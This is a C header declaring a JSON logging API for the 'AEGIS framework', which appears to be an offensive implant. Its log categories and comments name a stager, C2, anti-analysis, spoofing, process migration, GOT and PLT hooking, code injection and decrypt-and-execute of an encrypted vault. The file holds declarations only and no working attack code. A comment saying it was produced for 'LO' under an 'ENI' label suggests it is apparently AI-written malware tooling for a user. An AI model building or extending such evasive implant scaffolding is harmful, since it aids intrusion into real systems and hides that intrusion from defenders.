/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Structured JSON Logging (Header)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : common/logging.h
 *  Purpose        : Comprehensive transformation logging with JSON output.
 *                   Tracks every operation: memory mappings, hooks, code
 *                   injections, key rotations, and execution events.
 *  Deliverable    : Produces the JSON log file LO requested — every
 *                   transformation, address mapping, instruction, and
 *                   function is recorded here.
 * ============================================================================
 */

#ifndef AEGIS_LOGGING_H
#define AEGIS_LOGGING_H

#include "types.h"
#include <stdarg.h>

/* ── Log Categories ──────────────────────────────────────────────────────── */
typedef enum {
  LOG_CAT_STAGER = 0,
  LOG_CAT_CATALYST = 1,
  LOG_CAT_AUDITOR = 2,
  LOG_CAT_ALPHA = 3,
  LOG_CAT_BETA = 4,
  LOG_CAT_GHOST = 5,
  LOG_CAT_NANOMACHINE = 6,
  LOG_CAT_VAULT = 7,
  LOG_CAT_CRYPTO = 8,
  LOG_CAT_C2 = 9,
  LOG_CAT_WATCHDOG = 10,
  LOG_CAT_MIGRATION = 11,
  LOG_CAT_ANTIANALYSIS = 12,
  LOG_CAT_TRAMPOLINE = 13,
  LOG_CAT_SPOOF = 14,
} aegis_log_category_t;

/* ── Log Severity ────────────────────────────────────────────────────────── */
typedef enum {
  LOG_SEV_TRACE = 0,    /* Granular execution tracing                   */
  LOG_SEV_DEBUG = 1,    /* Development diagnostics                      */
  LOG_SEV_INFO = 2,     /* Operational milestones                       */
  LOG_SEV_WARN = 3,     /* Non-fatal anomalies                          */
  LOG_SEV_ERROR = 4,    /* Recoverable errors                           */
  LOG_SEV_CRITICAL = 5, /* Framework integrity compromise imminent      */
} aegis_log_severity_t;

/* Forward declaration — opaque context */
typedef struct aegis_log_ctx aegis_log_ctx_t;

/* ── Initialization / Teardown ───────────────────────────────────────────── */

/*
 * aegis_log_init — Initialize the logging subsystem.
 * @path:  Absolute path to the JSON output file.  NULL = memory-only mode.
 * @cap:   Maximum entries before rotation.  0 = use default (8192).
 * Returns: Opaque context pointer, or NULL on failure.
 */
aegis_log_ctx_t *aegis_log_init(const char *path, size_t cap);

/*
 * aegis_log_finalize — Flush all pending entries, write closing metadata
 *                      (total entries, framework version, runtime stats),
 *                      close the JSON array, and free the context.
 * @ctx: Context to finalize.  Set to NULL after return.
 */
void aegis_log_finalize(aegis_log_ctx_t *ctx);

/* ── Core Logging Functions ──────────────────────────────────────────────── */

/*
 * aegis_log_transform — PRIMARY DELIVERABLE LOGGER.
 * Every address mapping, hook installation, instruction modification,
 * function redirection, and memory transformation flows through here.
 *
 * @ctx:            Logging context
 * @cat:            Component category
 * @action:         Action identifier (e.g., "got_overwrite", "plt_redirect")
 * @target:         Target descriptor (e.g., "libc.so.6::write")
 * @addr_from:      Original address (NULL if not applicable)
 * @addr_to:        New/hooked address (NULL if not applicable)
 * @bytes_affected: Number of bytes modified
 * @fmt, ...:       printf-style detail string
 */
void aegis_log_transform(aegis_log_ctx_t *ctx, aegis_log_category_t cat,
                         const char *action, const char *target,
                         const void *addr_from, const void *addr_to,
                         size_t bytes_affected, const char *fmt, ...)
    __attribute__((format(printf, 8, 9)));

/*
 * aegis_log_event — General operational event.
 */
void aegis_log_event(aegis_log_ctx_t *ctx, aegis_log_category_t cat,
                     aegis_log_severity_t sev, const char *fmt, ...)
    __attribute__((format(printf, 4, 5)));

/*
 * aegis_log_memory_map — Record a memory mapping or protection change.
 * @operation:  "mmap", "mprotect", "munmap", "mremap"
 * @addr:       Base address of the region
 * @length:     Length in bytes
 * @old_prot:   Previous protection flags (-1 if new mapping)
 * @new_prot:   New protection flags (-1 if unmapping)
 * @purpose:    Human-readable purpose string
 */
void aegis_log_memory_map(aegis_log_ctx_t *ctx, const char *operation,
                          const void *addr, size_t length, int old_prot,
                          int new_prot, const char *purpose);

/*
 * aegis_log_hook — Record a function hook installation or removal.
 */
void aegis_log_hook(aegis_log_ctx_t *ctx, const char *library,
                    const char *function, const void *original_addr,
                    const void *hook_addr, const void *got_slot,
                    bool installed);

/*
 * aegis_log_ipc — Record an IPC message between Alpha and Beta nodes.
 */
void aegis_log_ipc(aegis_log_ctx_t *ctx, aegis_ipc_cmd_t cmd, pid_t from_pid,
                   pid_t to_pid, size_t payload_size, const char *details);

/*
 * aegis_log_crypto — Record a cryptographic operation.
 * @operation:  "encrypt", "decrypt", "rekey", "hkdf_derive"
 */
void aegis_log_crypto(aegis_log_ctx_t *ctx, const char *operation,
                      size_t data_size, const uint8_t *iv, const char *details);

/*
 * aegis_log_nano_exec — Record a single nanomachine execution step.
 * @opcode:          The opcode being executed
 * @vault_offset:    Byte offset into the encrypted vault
 * @chunk_size:      Size of the decrypted chunk
 * @exec_addr:       Address of the temporary execution buffer
 * @cycles_elapsed:  CPU cycles consumed by this step
 */
void aegis_log_nano_exec(aegis_log_ctx_t *ctx, uint32_t opcode,
                         uint64_t vault_offset, size_t chunk_size,
                         const void *exec_addr, uint64_t cycles_elapsed);

/*
 * aegis_log_syscall — Record a raw syscall invocation (trampoline logging).
 */
void aegis_log_syscall(aegis_log_ctx_t *ctx, uint16_t syscall_nr,
                       const void *trampoline_addr, long result,
                       const char *details);

/* ── Utility ─────────────────────────────────────────────────────────────── */

/* Get monotonic timestamp in nanoseconds */
uint64_t aegis_timestamp_ns(void);

/* Get the number of entries written so far */
size_t aegis_log_count(const aegis_log_ctx_t *ctx);

/* Category name string (for JSON serialization) */
const char *aegis_log_cat_str(aegis_log_category_t cat);

/* Severity name string (for JSON serialization) */
const char *aegis_log_sev_str(aegis_log_severity_t sev);

/* IPC command name string (for JSON serialization) */
const char *aegis_log_cmd_str(aegis_ipc_cmd_t cmd);

#endif /* AEGIS_LOGGING_H */
